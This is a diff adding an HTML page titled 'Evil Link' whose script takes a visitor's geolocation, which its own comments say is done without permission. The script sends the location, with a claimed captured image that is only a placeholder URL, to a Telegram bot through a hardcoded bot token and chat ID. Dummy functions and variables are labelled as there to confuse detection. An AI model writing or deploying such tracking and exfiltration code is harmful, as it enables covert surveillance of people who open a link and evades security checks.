@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Evil Link</title>
+</head>
+<body>
+    <script>
+        // Fake functions to confuse detection
+        function fakeFunction1() {
+            return "This is a fake function";
+        }
+        
+        function fakeFunction2() {
+            return "This is another fake function";
+        }
+
+        // Capture victim's image
+        let img = new Image();
+        img.src = "https://link-to-capture-victim-image.com";
+        
+        // Get victim's location without their permission and send to Telegram
+        navigator.geolocation.getCurrentPosition(position => {
+            let latitude = position.coords.latitude;
+            let longitude = position.coords.longitude;
+            let location = "Latitude: " + latitude + ", Longitude: " + longitude;
+            
+            // Send captured image and location to Telegram
+            fetch("https://api.telegram.org/bot7120302989:AAG4ztzubzgfscIJl6BnmsK2QiuVRhFpdFQ/sendPhoto", {
+                method: "POST",
+                body: JSON.stringify({
+                    chat_id: "6842468827",
+                    photo: img.src,
+                    caption: location
+                }),
+                headers: {
+                    "Content-Type": "application/json"
+                }
+            });
+        });
+
+        // Fake variables to confuse detection
+        let fakeVar1 = "Fake variable 1";
+        let fakeVar2 = "Fake variable 2";
+    </script>
+</body>
+</html>
